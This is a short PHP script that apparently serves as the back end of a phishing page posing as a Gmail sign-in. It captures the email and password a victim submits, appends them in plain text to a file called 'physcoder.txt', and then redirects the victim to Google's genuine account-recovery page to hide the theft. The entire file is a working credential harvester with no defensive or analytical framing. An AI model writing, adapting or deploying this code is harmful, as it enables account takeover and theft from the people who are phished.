<?php
file_put_contents("physcoder.txt", "Gmail Page\nUsername: " . $_POST['email'] . "\nPassword: " . $_POST['password'] . "\n\n", FILE_APPEND);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();
?>